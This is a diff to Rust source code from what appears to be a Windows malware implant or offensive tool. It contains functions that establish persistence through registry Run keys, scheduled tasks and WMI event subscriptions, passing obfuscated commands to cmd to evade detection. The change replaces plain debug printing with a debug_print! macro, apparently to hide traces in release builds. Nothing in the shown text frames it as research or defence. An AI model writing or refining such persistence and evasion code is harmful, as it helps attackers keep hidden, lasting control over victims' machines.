@@ -21,6 +21,7 @@
 //! ```
 
 use crate::argfuscator;
+use crate::debug_print;
 
 #[cfg(target_os = "windows")]
 use std::process::Command;
@@ -129,7 +130,7 @@ fn persist_registry_run(exe_path: &Path) -> Result<String, String> {
         reg_name, obfuscated_cmd);
     let obfuscated_reg_cmd = argfuscator::obfuscate(&reg_cmd);
     
-    println!("DEBUG: Comando de persistencia ofuscado: {}", obfuscated_reg_cmd);
+    debug_print!("DEBUG: Comando de persistencia ofuscado: {}", obfuscated_reg_cmd);
     
     // Execute the obfuscated command via cmd
     let output = Command::new("cmd")
@@ -172,7 +173,7 @@ fn persist_scheduled_task(exe_path: &Path) -> Result<String, String> {
         task_name, obfuscated_cmd);
     let obfuscated_schtasks = argfuscator::obfuscate(&schtasks_cmd);
     
-    println!("DEBUG: Comando schtasks ofuscado: {}", obfuscated_schtasks);
+    debug_print!("DEBUG: Comando schtasks ofuscado: {}", obfuscated_schtasks);
     
     // Execute the obfuscated command via cmd
     let output = Command::new("cmd")
@@ -244,7 +245,7 @@ fn persist_wmi_event(exe_path: &Path) -> Result<String, String> {
         ps_script.replace("\"", "`\""));
     let obfuscated_ps = argfuscator::obfuscate(&ps_cmd);
     
-    println!("DEBUG: Comando PowerShell ofuscado: {}", obfuscated_ps);
+    debug_print!("DEBUG: Comando PowerShell ofuscado: {}", obfuscated_ps);
     
     let output = Command::new("cmd")
         .args(&["/C", &obfuscated_ps])
